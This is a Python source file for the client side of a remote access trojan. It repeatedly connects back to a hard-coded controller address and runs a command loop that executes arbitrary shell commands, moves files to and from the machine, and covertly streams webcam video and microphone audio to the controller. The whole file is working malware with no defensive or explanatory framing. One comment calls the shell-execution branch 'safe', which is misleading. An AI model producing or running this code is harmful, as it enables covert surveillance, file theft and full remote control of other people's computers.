import socket
import time
import subprocess
import json
import os
import threading
import cv2
import pyaudio
import pickle
import struct

# --- Configuration ---
SERVER_IP = '192.168.56.1' # Change this to your server's IP
CONTROL_PORT = 5555
VIDEO_PORT = 9999
AUDIO_PORT = 9998

# --- Global Flags for Stream Control ---
video_stream_active = False
audio_stream_active = False

# --- Reliable Send/Receive for the Main Control Connection ---
def reliable_send(sock, data):
    try:
        jsondata = json.dumps(data)
        sock.send(jsondata.encode())
    except (ConnectionResetError, BrokenPipeError):
        print("[-] Control connection lost.")

def reliable_recv(sock):
    data = ''
    while True:
        try:
            data = data + sock.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue
        except (ConnectionResetError, ConnectionAbortedError):
            print("[-] Control connection lost. Returning to connection loop.")
            return None

# --- File Transfer Functions ---
def upload_file(sock, file_name):
    try:
        with open(file_name, 'rb') as f:
            sock.send(f.read())
    except FileNotFoundError:
        sock.send(b'FILE_NOT_FOUND_ERROR')
    except Exception as e:
        print(f"[-] Upload error: {e}")

def download_file(sock, file_name):
    try:
        with open(file_name, 'wb') as f:
            sock.settimeout(2)
            chunk = sock.recv(1024)
            while chunk:
                f.write(chunk)
                chunk = sock.recv(1024)
    except socket.timeout:
        pass
    finally:
        sock.settimeout(None)

# --- Streaming Functions (to be run in threads) ---
def start_video_stream():
    global video_stream_active
    video_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        video_socket.connect((SERVER_IP, VIDEO_PORT))
    except ConnectionRefusedError:
        print("[-] Video server connection refused.")
        video_stream_active = False
        return

    cap = cv2.VideoCapture(0)
    print("[*] Video streaming started...")
    while video_stream_active:
        ret, frame = cap.read()
        if not ret: break
        frame_data = pickle.dumps(frame)
        message_size = struct.pack("L", len(frame_data))
        try:
            video_socket.sendall(message_size + frame_data)
        except (ConnectionResetError, BrokenPipeError):
            break
    
    print("[*] Video streaming stopped.")
    cap.release()
    video_socket.close()
    video_stream_active = False

def start_audio_stream():
    global audio_stream_active
    audio_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        audio_socket.connect((SERVER_IP, AUDIO_PORT))
    except ConnectionRefusedError:
        print("[-] Audio server connection refused.")
        audio_stream_active = False
        return

    p = pyaudio.PyAudio()
    stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
    
    print("[*] Audio streaming started...")
    while audio_stream_active:
        try:
            data = stream.read(1024)
            audio_socket.sendall(data)
        except (ConnectionResetError, BrokenPipeError, IOError):
            break

    print("[*] Audio streaming stopped.")
    stream.stop_stream()
    stream.close()
    p.terminate()
    audio_socket.close()
    audio_stream_active = False

# --- Main Shell and Connection Logic ---
def shell(s):
    global video_stream_active, audio_stream_active
    while True:
        command = reliable_recv(s)
        if command is None: break

        if command == 'quit':
            break
        elif command == 'stream_start':
            if not video_stream_active:
                video_stream_active = True
                threading.Thread(target=start_video_stream, daemon=True).start()
            if not audio_stream_active:
                audio_stream_active = True
                threading.Thread(target=start_audio_stream, daemon=True).start()
            reliable_send(s, "[+] Stream threads initiated.")
        elif command == 'stream_stop':
            video_stream_active = False
            audio_stream_active = False
            reliable_send(s, "[-] Stopping stream threads.")
        elif command[:3] == 'cd ':
            try:
                os.chdir(command[3:])
                reliable_send(s, f"Changed directory to: {os.getcwd()}")
            except Exception as e:
                reliable_send(s, str(e))
        elif command[:8] == 'download':
            upload_file(s, command[9:])
        elif command[:6] == 'upload':
            download_file(s, command[7:])
        elif command[:5] == 'exec ':
            # New, safe way to execute shell commands
            cmd_to_run = command[5:]
            execute = subprocess.Popen(cmd_to_run, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode(errors='replace')
            if not result:
                result = f"Command '{cmd_to_run}' executed with no output."
            reliable_send(s, result)
        else:
            # If the command is not recognized, inform the server.
            reliable_send(s, f"Command not recognized: {command}")

def connection():
    while True:
        time.sleep(10)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, CONTROL_PORT))
            shell(s)
            s.close()
        except Exception:
            continue

if __name__ == "__main__":
    connection()
